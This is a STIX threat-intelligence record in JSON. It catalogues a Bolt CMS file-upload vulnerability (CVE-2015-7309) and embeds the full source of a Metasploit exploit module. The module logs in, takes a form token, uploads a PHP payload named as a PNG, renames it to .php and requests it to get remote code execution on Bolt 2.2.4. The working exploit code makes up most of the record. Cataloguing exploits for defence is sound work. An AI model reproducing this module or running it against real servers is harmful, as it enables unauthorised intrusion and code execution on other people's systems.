{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9f668a0f-dec8-4e7c-980f-15f927f66a0c",
    "created": "2024-08-14T17:09:32.993288Z",
    "modified": "2024-08-14T17:09:32.993292Z",
    "name": "CMS Bolt File Upload Vulnerability",
    "description": " Bolt CMS contains a flaw that allows an authenticated remote attacker to execute arbitrary PHP code. This module was tested on version 2.2.4.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/bolt_file_upload.rb",
            "external_id": "bolt_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-7309"
        },
        {
            "source_name": "reference",
            "url": "http://blog.curesec.com/article/blog/Bolt-224-Code-Execution-44.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'CMS Bolt File Upload Vulnerability',\n      'Description'     => %q{\n          Bolt CMS contains a flaw that allows an authenticated remote\n          attacker to execute arbitrary PHP code. This module was\n          tested on version 2.2.4.\n        },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Tim Coen', # Vulnerability Disclosure\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module\n        ],\n      'References'      =>\n        [\n          ['CVE', '2015-7309'],\n          ['URL', 'http://blog.curesec.com/article/blog/Bolt-224-Code-Execution-44.html']\n        ],\n      'DisclosureDate'  => '2015-08-17',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [['Bolt 2.2.4', {}]],\n      'DefaultTarget'   => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI',  [true, 'The base path to the web application', '/']),\n        OptString.new('FOLDERNAME', [true, 'The theme path to the web application (default: base-2014)', 'base-2014']),\n        OptString.new('USERNAME',   [true, 'The username to authenticate with']),\n        OptString.new('PASSWORD',   [true, 'The password to authenticate with'])\n      ])\n  end\n\n  def check\n    cookie = bolt_login(username, password)\n    return Exploit::CheckCode::Detected unless cookie\n\n    res = send_request_cgi(\n      'method'      => 'GET',\n      'uri'         => normalize_uri(target_uri.path, 'bolt'),\n      'cookie'      => cookie\n    )\n\n    if res && res.code == 200 && res.body.include?('Bolt 2.2.4</b>: Sophisticated, lightweight & simple CMS')\n      return Exploit::CheckCode::Vulnerable\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def fname\n    datastore['FOLDERNAME']\n  end\n\n  def bolt_login(user, pass)\n    res = send_request_cgi(\n      'method'      => 'GET',\n      'uri'         => normalize_uri(target_uri.path, 'bolt', 'login')\n    )\n\n    fail_with(Failure::Unreachable, 'No response received from the target.') unless res\n\n    session_cookie = res.get_cookies\n    vprint_status(\"Logging in...\")\n    res = send_request_cgi(\n      'method'      => 'POST',\n      'uri'         => normalize_uri(target_uri.path, 'bolt', 'login'),\n      'cookie'      => session_cookie,\n      'vars_post'   => {\n        'username'  => user,\n        'password'  => pass,\n        'action'    => 'login'\n      }\n    )\n\n    return res.get_cookies if res && res.code == 302 && res.redirection.to_s.include?('/bolt')\n    nil\n  end\n\n  def get_token(cookie, fname)\n    res = send_request_cgi(\n      'method'      => 'GET',\n      'uri'         => normalize_uri(target_uri, 'bolt', 'files', 'theme', fname),\n      'cookie'      => cookie\n    )\n\n    if res && res.code == 200 && res.body =~ / name=\"form\\[_token\\]\" value=\"(.+)\" /\n      return Regexp.last_match[1]\n    end\n    nil\n  end\n\n  def rename_payload(cookie, payload, fname)\n    res = send_request_cgi(\n      'method'      => 'POST',\n      'uri'         => normalize_uri(target_uri.path, 'async', 'renamefile'),\n      'vars_post'   => {\n        'namespace' => 'theme',\n        'parent'    => fname,\n        'oldname'   => \"#{payload}.png\",\n        'newname'   => \"#{payload}.php\"\n      },\n      'cookie'      => cookie\n    )\n\n    return true if res && res.code == 200 && res.body.include?('1')\n    nil\n  end\n\n  def exploit\n    vprint_status(\"Authenticating using #{username}:#{password}\")\n\n    cookie = bolt_login(username, password)\n    fail_with(Failure::NoAccess, 'Unable to login. Verify USERNAME/PASSWORD or TARGETURI.') if cookie.nil?\n    vprint_good(\"Authenticated with Bolt.\")\n\n    token = get_token(cookie, fname)\n    fail_with(Failure::Unknown, 'No token found.') if token.nil?\n    vprint_good(\"Token \\\"#{token}\\\" found.\")\n\n    vprint_status(\"Preparing payload...\")\n    payload_name = Rex::Text.rand_text_alpha_lower(10)\n\n    data = Rex::MIME::Message.new\n    data.add_part(payload.encoded, 'image/png', nil, \"form-data; name=\\\"form[FileUpload][]\\\"; filename=\\\"#{payload_name}.png\\\"\")\n    data.add_part(\"#{token}\", nil, nil, 'form-data; name=\"form[_token]\"')\n    post_data = data.to_s\n\n    vprint_status(\"Uploading payload...\")\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri, 'bolt', 'files', 'theme', fname),\n      'ctype'     => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'      => post_data,\n      'cookie'    => cookie\n    )\n\n    fail_with(Failure::Unknown, 'Unable to upload payload.') unless res && res.code == 302\n    vprint_good(\"Uploaded the payload.\")\n\n    rename = rename_payload(cookie, payload_name, fname)\n    fail_with(Failure::Unknown, 'No renamed filename.') if rename.nil?\n\n    php_file_name = \"#{payload_name}.php\"\n    payload_url = normalize_uri(target_uri.path, 'theme', fname, php_file_name)\n    vprint_status(\"Parsed response.\")\n\n    register_files_for_cleanup(php_file_name)\n    vprint_status(\"Executing the payload at #{payload_url}.\")\n    send_request_cgi(\n      'uri'     => payload_url,\n      'method'  => 'GET'\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-08-17",
    "x_mitre_platforms": [
        "php'"
    ]
}